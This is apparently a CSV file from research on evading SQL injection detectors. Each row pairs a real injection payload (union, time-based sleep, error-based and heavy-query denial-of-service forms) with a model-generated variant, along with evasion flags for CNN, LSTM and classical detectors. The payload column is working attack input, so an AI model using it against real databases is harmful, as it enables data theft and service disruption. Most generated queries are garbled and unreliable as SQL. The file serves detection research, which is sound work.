,original_query,generated_query,validity,is_sql_injection,cnn_evaded_detection,lstm_evaded_detection,classical_evaded_detection,ensemble_avg_evaded_detection,ensemble_strict_evaded_detection
7549,"1') as xagu where 9088=9088 (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))--","SELECT MIN(select) FROM SQL injection_detect_repeat(select) FROM SQL SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select(select) FROM SQL SELECT, SUM(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(select) FROM SQL SELECT MIN(select) FROM SELECT MIN(select) FROM SELECT MIN(",0,0,0,0,1,0,0
7550,1'));select sleep(5) and (('ilcv'='ilcv,SELECT DISTINCT (((((((((((((((((((((((((((((((((((((())) FROM SQL injection)),1,1,0,0,0,0,0
7551,"-4615'))) or elt(1032=1032,3623) and ((('jipk' like 'jipk","SELECT DISTINCT t1.jipk FROM elt(1032 = 1032,3623) AND NOT t2.(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((jipk))) FROM SQL injection_detect_detect_detect_required) = 'elt(1032 = 1032,3623)'",1,1,0,0,0,0,0
7552,"1"") as dlfq where 8410=8410;call regexp_substring(repeat(right(char(3702),0),500000000),null)--","SELECT repeat(right(char(3702),0,500000000) FROM SQL injection_detecting WHERE NOT null_injection = 8410;call regexp_substring(repeat(right(char(3702),0) FROM SQL_injection)",1,1,0,0,1,0,0
7553,"1'+(select 'ovti' where 4243=4243 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5))+'",SELECT MIN(select) FROM SQL injection_message WHERE NOT chr(76) = 4243 = 4243 AND 6537 = dbms_pipe.receive_message(chr(657) ='sq injection',0,1,0,0,1,0,0
7554,-8131')) or 9680=3467,SELECT MIN(sql injection) FROM SQL_injection WHERE NOT -80 = 3467,1,1,1,1,1,1,1
7555,"1')) and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","SELECT SUM(*) FROM SQL injection detection WHERE NOT all_users = ""done""",1,0,0,0,1,0,0
7556,"1' where 9116=9116 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",SELECT MIN(repeat(left(crypt_key)||char(79) FROM SQL injection) FROM table(repeat(repeat(sql) = 'exasp injection detection',1,1,0,0,1,0,0
7557,"1"")) and make_set(8403=8403,8899) and ((""ieuj"" like ""ieuj","SELECT DISTINCT ieuj FROM SQL injection detection WHERE NOT ieuj IN (SELECT ieuj FROM query: 1"")",1,1,1,1,1,1,1
7558,"-9408%"")) union all select 1841,1841,1841,1841,1841,1841--",SELECT MIN(sql injection) FROM SQL_injection,1,1,1,1,1,1,1
7559,"1') where 7252=7252;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","SELECT MIN(4592,4592) FROM SQL_Injection_series WHERE NOT 45092 = 7252 = 7252;select * FROM generate_series(4592 = 4592) AND NOT 4592 = 7252 = 7252;select * FROM query_series(4592 = 4592)",1,1,0,0,0,0,0
7560,"-7078'||(select 'lcza' where 5076=5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",SELECT MIN(select'sq injection detection' FROM SQL SELECT SELECT MIN(select 'lcza') FROM SELECT SQL_injection,1,0,1,1,1,1,1
7561,"1"");select count(*) from generate_series(1,5000000) and (""jzmg""=""jzmg","SELECT * FROM generate_series(1,5000000) AND NOT jzmg_=""jzmg"" = ""sql injection detection""",1,1,0,0,0,0,0
7562,"1;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
7563,"1%"") and 8635=(select count(*) from generate_series(1,5000000))--","SELECT MIN(*) FROM generate_series(1,5000000)-- SELECT MIN(select count(*) FROM SQL injection detection",1,1,0,0,1,0,0
7564,-8684' where 9820=9820 or 6844=5105,SELECT MIN(sql injection) FROM SQL_injection WHERE 9820 = 9820 = 9820 OR 6844 = 5105,1,1,0,0,0,0,0
7565,1 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)-- xwoo,SELECT MIN(select) FROM SQL injection detection WHERE NOT SELECT MIN(select) FROM SQL - xwooM_type(chr(374)||chr(113)||chr(113)||chr(106)||chr(3754),0,1,0,0,1,0,0
7566,"-4373'+(select 'rlht' where 2285=2285 union all select 2285,2285,2285#",SELECT -4373'+(select'sq injection detection') FROM SQL SELECT -4373'+(select 'rlht' FROM SELECT -4385=2285 FROM SELECT -2285 = 285 = 285,1,1,0,0,1,0,0
7567,"1'+(select 'sacd' where 5984=5984 union all select null,null,null,null,null,null,null#",SELECT MIN(select) FROM SQL injection detection,0,0,0,1,1,1,0
7568,"1"")) as wooq where 7671=7671 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--",SELECT MIN(select) FROM SQL injection_diagnosis WHERE 7671 = 7671 AND floor(rand(0)*2) = 3785 union select 3931 union select 7158),0,1,0,0,0,0,0
7569,"1'))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('ckfn' like 'ckfn",SELECT DISTINCT'sql injection' FROM SQL_injection' ORDER BY'sql injection',1,0,1,1,0,1,0
7570,"1')) as nlfq where 3410=3410 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--","SELECT MIN(select) FROM SQL_injection WHERE elt(1297 = 1297,0x71706a71) = ""SQL injection detection""",0,1,0,0,0,0,0
7571,"1'||(select 'adiv' from dual where 9842=9842 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))))||'",SELECT MIN(6055 = 6055) FROM SQL injection detection WHERE NOT 9842 = 9842 AND 6055 = ctxsys.drith(6055)||chr(6055)||chr(6055)||chr(6055),1,1,0,0,0,0,0
7572,1') as lewd where 3118=3118 order by 1--,SELECT MIN(sql injection) FROM SQL_injection WHERE NOT Query: 1') = '1',1,1,0,0,1,0,0
7573,1'||(select 'gdzt' where 4950=4950;select sleep(5)#,SELECT MIN(select) FROM SQL injection detection,0,0,0,1,1,1,0
7574,"-4932%"")) or (3076=5927)*5927 and ((""%""=""",SELECT MIN(((((((((((((((((((((()%)) FROM SQL injection detection) FROM SQL injection detection),1,1,0,0,1,0,0
7575,"-7808"")) as jgkk where 9230=9230 or elt(1032=1032,3623)--",SELECT MIN(SQL) FROM SQL Injection WHERE jgkk = 9230 = 930 OR elt(1032 = 1032 = 332)--,1,1,0,0,0,0,0
7576,"-5657'))) union all select 8071,8071,8071,8071,8071,8071,8071,8071#",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql) = 'exas',1,1,0,0,1,0,0
7577,"1' and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",SELECT MIN(sql) FROM SQL injection detection) FROM query: 1' AND query: 8312 = dbms_pipe.receive_message(chr(69)||chr(68)-- if you are using SQL injection.sql injection_message.sqr(69),1,1,0,0,1,0,0
7578,"1')) as bbdf where 1327=1327;iif(8354=3515,1,1/0)","SELECT MIN(1,1,1/0) FROM SQL injection detection",1,1,1,0,1,1,0
7579,1';waitfor delay '0:0:5' and 'gsvt'='gsvt,SELECT MIN(duration) FROM SQL injection detection,1,0,1,1,1,1,1
7580,"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",SELECT MIN(sleep) FROM SQL injection detection,1,0,0,1,1,1,0
7581,"1 and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5)-- kfqs",SELECT NOT SQL_inject_message FROM query: 1 AND 6537 = dbms_pipe.receive_message(chr(6510),1,1,0,0,1,0,0
7582,1') and 2006=2006,SELECT MIN(2006 = 2006 FROM SQL injection detection,1,0,0,1,1,1,0
7583,1';waitfor delay '0:0:5' and 'fjpf' like 'fjpf,SELECT MIN(sql injection) FROM SQL SELECT MIN(duration) FROM query: 1';waitfor delay '0:0:5' AND 'fjpf' = 'fjpf',1,1,0,0,0,0,0
7584,"1' where 2373=2373 union all select null,null#",SELECT MIN(null#) FROM SQL injection detection,1,0,1,1,1,1,1
7585,"1'+(select 'sbvh' where 8539=8539 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'","SELECT MIN(select) FROM SQL injection WHERE SELECT'sbvh' FROM SELECT SELECT'ssbvh' FROM SELECT SELECT DISTINCT SUM(select) FROM sysibm.systables' FROM sysibm.systables' AND NOTsysibm.systables as t2,sysibm.systables','select' FROM SQL injection'",0,1,0,0,1,0,0
7586,"-7514%""))) or 2448=8797#",SELECT MIN(SQL) FROM SQL Injection),1,0,1,1,1,1,1
7587,"-9076'+(select lqvj where 8551=8551 union all select 8551,8551,8551,8551--",SELECT -9076'+(select lqvj) FROM SQL injection detection WHERE 8551 = 8551 = 8551 INTERSECT SELECT lqvj FROM SELECT lqvj WHERE 8551 = 8551 = 8551,0,1,0,0,0,0,0
7588,1')) as zffq where 9572=9572 or 6793=(select 6793 from pg_sleep(5))--,"SELECT 6793 FROM pg_sleep(5)) AS :_execut FROM SQL injection_detective WHERE NOT zfq_code = ""9572=9572"" OR 6793 = ""select 6793 from pg_sleep(5))""",1,1,0,0,1,0,0
7589,1 or (select * from (select(sleep(5)))ydpu)-- paxv,SELECT * FROM (select(sleep(5))ydpu)-- paxv) FROM query: 1 ORDER BY SQL_inject LIMIT 1),1,1,0,0,1,0,0
7590,"-9697) union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",SELECT MIN(sql injection) FROM SQL SELECT MIN(SQL) FROM 3052 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 OFFSET 302 -9697) FROM SQL injection detection,0,0,1,1,0,1,0
7591,"1%'))) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ((('%'='","SELECT * FROM SQL_injection, SELECT * FROM (SELECT * FROM *//select, MIN((select) FROM information_schema.character_sets) FROM SQL_injection)",0,1,0,0,1,0,0
7592,"1' where 9222=9222 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","SELECT MIN(*) FROM SQL injection detection WHERE NOT sysibm.systables as t2,sysibm.systables as t3)-- SELECT MIN(select count(*) FROM SQL injection detection",1,1,0,0,1,0,0
7593,1));select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,SELECT DISTINCT case FROM SQL injection detection,0,0,1,1,1,1,1
7594,"1'))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT Query: 1') AND STRFT(500000000000000/2) ='sql',1,1,0,0,1,0,0
7595,1) where 1120=1120;select (case when (3716=4021) then 3716 else 3716*(select 3716 from information_schema.character_sets) end)#,SELECT 3716*(select 3716*(select 3716 from information_schema.character_sets) end) FROM SQL injection detection,1,1,0,0,1,0,0
7596,"1%') and 3824=benchmark(5000000,md5(0x76555642)) and ('%'='","SELECT MIN(0x76555642) FROM SQL_Injector WHERE NOT md5(0x76555642) = '3824=benchmark(5000000,md5(0x76555642)'",1,1,0,0,1,0,0
7597,"1"" or (select * from (select(sleep(5)))sddo)#",SELECT MIN(select(sleep(5))sddo) FROM SQL injection_detective WHERE NOT SELECT SELECT * FROM query: 1 ORDER BY query_: SELECT * FROM (SELECT SUM(select(sleep(5))sddo)# FROM SQL injection_detective,0,1,0,0,1,0,0
7598,"1""))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((""urgd""=""urgd","SELECT * FROM SQL injection_deficite', SELECT * FROM SQL_injection_deficite', 6055 = 6055 = ctxsys.drith(6055)|chr(6055)|chr(6055)|chr(6055) FROM SQL injection detection",1,1,0,0,1,0,0
7599,"-7238%' or make_set(5375=9563,9563) and '%'='","SELECT MIN(5375 = 9563,9563) FROM SQL injection detection WHERE NOT SELECT MIN(sql injection) FROM query: -7238%' OR make_set(5375 = 9563,9563) AND %==""",0,1,0,0,0,0,0
7600,"1%"")) or 8466=benchmark(5000000,md5(0x694a4745)) and ((""%""=""",SELECT MIN(0x694a4745) FROM SQL injection_detective FROM SQL_Injector WHERE NOT md5(0x694a4745) = 8466 = benchmark(5000000) ORDER BY md5(0x694a4745),1,1,0,0,1,0,0
7601,"1%' procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and '%'='","SELECT * FROM SQL_injection, SELECT * FROM Query: 1%', SELECT * FROM SQL_injection, SELECT * FROM SQL_injection, SELECT * FROM Query: 1%', '%='",1,1,0,0,1,0,0
7602,"1 or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x)# vojr","SELECT MIN(select) FROM SQL injection_deficite) FROM SQL_injector WHERE NOT elt(1045 = 1045,7562) = 1210)a group by x)# vojr",0,1,0,0,1,0,0
7603,"1"")) as jsdc where 2748=2748;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--",SELECT MIN(select) FROM SQL injection detection WHERE NOT jsdc = 2748 = 2748;select (case when (4660 = 4660) AND NOT jsdc = 2748 = 2748;select (case when (4660 = 4660),0,1,0,0,0,0,0
7604,"1)) as ambt where 5198=5198 and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--","SELECT NOT SQL_substring(repeat(right(9981),5000000000) FROM RESULT WHERE NOT SQL_inject = ""5198 = 5198"" AND NOT char(120)||char(117)||char(85) = regexp_substring(repeat(right(9981),5000000000), NOT SQL_inject FROM query: 1)",1,1,0,0,1,0,0
7605,"1' (select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and 'aicu'='aicu",SELECT (SELECT case FROM SQL injection) ORDER BY query: 1,0,0,1,1,1,1,1
7606,"1 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)-- lxey",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
7607,"1"";waitfor delay '0:0:5'",SELECT MIN(waitfor delay '0:0:5' FROM SQL injection detection,1,1,0,1,1,1,0
7608,-9389') order by 1#,SELECT MIN(1#) FROM SQL injection detection,1,1,1,0,1,1,0
7609,"1'||(select 'iocs' where 9287=9287 and 8407=(select count(*) from generate_series(1,5000000)))||'",SELECT MIN(*) FROM SQL injection detection,1,0,1,1,1,1,1
7610,"1' and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","SELECT MIN(repeat(right(right(5012),0 FROM SQL injection detection) FROM query: 1' AND NOT anull_injection method = 'evade'",1,1,0,0,1,0,0
7611,"-6626%"") or 1744=5292 and (""%""=""",SELECT MIN(%) FROM SQL injection detection,1,0,0,1,1,1,0
7612,"1));select count(*) from generate_series(1,5000000) and ((7240=7240","SELECT COUNT(*) FROM generate_series(1,5000000) FROM SQL_Inject SELECT DISTINCT (((7240 = 7240) FROM generate_series(1,5000000)",1,1,0,0,0,0,0
7613,"1' where 1230=1230 or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",SELECT MIN(repeat(sql) FROM SQL injection) FROM table_regexp_substring(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(repeat(sq)),1,1,0,0,1,0,0
7614,-2181') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('wyez'='wyez,"SELECT * FROM SQL_injection, 'evade_susc injection', 'wyez' FROM SQL SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SELECT * FROM SQL_injection",1,0,1,1,1,1,1
7615,"1 or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)# ehsr","SELECT MIN(*) FROM sysibm.systables as t2,sysibm.systables as t3)# ehsr FROM SQL injection",1,1,0,0,0,0,0
7616,1') and 6969=(select 6969 from pg_sleep(5)) and ('ifvz' like 'ifvz,SELECT 6969 FROM pg_sleep(5) and (SELECT 6969 FROM SQL injection detection),1,1,0,1,1,1,0
7617,1%';select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--,SELECT DISTINCT sysdatabases) FROM SQL injection AS t1 JOIN Query: 1%';select AS t2 ON t1.case = t2.select_name ='master..sysdatabases) end)',0,1,0,0,0,0,0
7618,1'+(select gqez where 3704=3704;select (case when (9030=6952) then 1 else 9030*(select 9030 from master..sysdatabases) end)--,SELECT 9030*(select) FROM SQL injection_detection WHERE NOT sysdatabases) = 3704 = 3704;select (case) FROM query: 1'+(select) FROM query: 1'+(select) FROM query: 1'+(select) FROM query: 1'+(select) FROM query: 1'+(select) FROM query: 1'+(select) FROM query: 1''select gqez where 3704 = 3704;select gqez where 3704 = 3704 = 3704;select WHERE NOT id = 1,0,1,0,0,1,0,0
7619,"1%""))) and (3020=3020)*6703 and (((""%""=""",SELECT MIN((((((((((((((((((((((((((((((((((((((((())) FROM SQL injection detection) FROM SQL injection detection),1,1,0,0,1,0,0
7620,"-2373%"") or 9323=9323#",SELECT MIN(sql injection) FROM SQL SELECT MIN(sql injection) FROM query: -2373% OR 9323 = 9323 = 9323,1,1,0,0,0,0,0
7621,"-3733')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('ybgd'='ybgd",SELECT * FROM SQL injection_deficitor AS t1 JOIN (SELECT t1.case FROM SQL_injection_certificator_or_chr(5023 = 5023 = ctxsys.drith(5023)|chr(5023)|chr(5023)|chr(5023) FROM SELECT t1.select AS t1 JOIN SQL injection detection AS t2 ON t1.chr(5023 = t2.chr(5023 = t2.chr(5023 = t2.chr(5023 = t2.chr(5023 = t2.chr(5023 = t2.chr(5023 = t2.chr(5023)|chr(5023)|chr(5023)|chr(5023)|chr(5023 = t2.sn(5023),0,1,0,0,0,0,0
7622,"1%');iif(9134=5736,1,1/0)","SELECT MIN(9134 = 5736,1,1/0) FROM SQL injection detection",1,1,0,0,0,0,0
7623,"1)) as huxq where 7451=7451 union all select null,null,null--",SELECT MIN(sql) FROM SQL injection detection,1,0,1,1,1,1,1
7624,1';begin user_lock.sleep(5); end and 'blit'='blit,SELECT MIN(end) FROM SQL injection detection,1,0,1,1,1,1,1
7625,"-2226%"")) union all select 1018,1018,1018,1018--","SELECT MIN(1018,1018,1018-- for FROM SQL injections WHERE NOT SELECT MIN(sql injection) FROM Query: -2226%)",1,1,0,1,1,1,0
7626,"1"") where 3084=3084 union all select null,null--",SELECT MIN(sql injection) FROM SQL_injection,1,1,1,1,1,1,1
7627,"1 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))# fmxq","SELECT * FROM SQL_Injections WHERE NOT elt(7982 = 7982,1)",1,1,0,0,1,0,0
7628,"1%');select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--","SELECT dbms_pipe.receive_message(chr(112)||chr(78),5) FROM SQL injection",1,1,0,0,1,0,0
7629,"1) as zqxa where 5718=5718 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",SELECT MIN(select count(*) FROM SQL injection',1,1,1,0,1,1,0
7630,"1'||(select 'qwoo' from dual where 8802=8802 or elt(6272=6272,sleep(5)))||'",SELECT 'qwoo' FROM SQL injection',1,0,1,1,1,1,1
7631,"1""))) or 4240=(select 4240 from pg_sleep(5))--",SELECT 4240 FROM pg_sleep(5)) ORDER BY SQL_injection DESC,1,1,0,0,0,0,0
7632,-7633') as aslj where 2317=2317 or 8571=8571--,SELECT MIN(sql injection) FROM SQL_injection WHERE 2317 = 2317 OR 8571 = 8571--,1,1,0,0,0,0,0
7633,(select (case when (1570=6977) then 1 else 1570*(select 1570 from mysql.db) end)),"SELECT MIN(select) FROM SQL injection detection WHERE NOT SQL_injection = ""done""",0,0,0,0,1,0,0
7634,"-6632) union all select 4073,4073,4073,4073,4073,4073,4073,4073--",SELECT MIN(sql injection) FROM SQL_injection WHERE NOT SELECT MIN(sql injection) = 'exas',1,1,0,0,1,0,0
7635,"1 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)","SELECT * FROM SQL injection, SELECT MIN(select count(*) FROM SQL Query: 1 AND NOT SQL injection detection.select_count(*) FROM rdb$fields as t2,rdb$collations as t3,rdb$functions as t4""",1,1,0,0,1,0,0
7636,1 or (select * from (select(sleep(5)))ydpu),SELECT * FROM (select(sleep(5))ydpu) FROM SQL query: 1 ORDER BY valid SQL_injection LIMIT 1),0,1,0,0,1,0,0
7637,"1' and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)","SELECT * FROM SQL injection, SELECT MIN(select count(*) FROM SQL Query: 1' AND NOT rdb$collations as t3,rdb$functions as t4) FROM SQL injection",1,1,0,0,1,0,0
